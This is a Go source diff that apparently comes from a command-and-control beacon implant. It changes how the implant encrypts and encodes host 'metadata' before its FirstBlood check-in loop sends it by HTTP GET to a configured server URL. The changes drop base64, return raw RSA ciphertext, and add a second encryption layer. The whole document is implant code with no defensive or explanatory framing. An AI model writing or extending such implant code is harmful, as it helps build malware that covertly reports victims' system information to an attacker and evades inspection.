@@ -3,7 +3,6 @@ package packet
 import (
 	"bytes"
 	"crypto/sha256"
-	"encoding/base64"
 	"encoding/binary"
 	"fmt"
 	"main/config"
@@ -16,7 +15,7 @@ import (
 )
 
 var (
-	encryptedMetaInfo string
+	encryptedMetaInfo []byte
 	clientID          int
 )
 
@@ -115,15 +114,15 @@ func MakePacket(replyType int, b []byte) []byte {
 
 }
 
-func EncryptedMetaInfo() (string, error) {
+func EncryptedMetaInfo() ([]byte, error) {
 	packetUnencrypted := MakeMetaInfo()
 	packetEncrypted, err := crypt.RsaEncrypt(packetUnencrypted)
 	if err != nil {
-		return "", err
+		return nil, err
 	}
 
-	finalPakcet := base64.StdEncoding.EncodeToString(packetEncrypted)
-	return finalPakcet, nil
+	//finalPakcet := base64.StdEncoding.EncodeToString(packetEncrypted)
+	return packetEncrypted, nil
 }
 
 /*
@@ -218,6 +217,7 @@ func MakeMetaInfo() []byte {
 
 func FirstBlood() bool {
 	encryptedMetaInfo, _ = EncryptedMetaInfo()
+	encryptedMetaInfo, _ = crypt.EncryptMultipleTypes(encryptedMetaInfo, config.Http_get_metadata_crypt)
 	for {
 		data, err := HttpGet(config.GetUrl, encryptedMetaInfo, config.Http_get_metadata_crypt)
 		if err == nil {
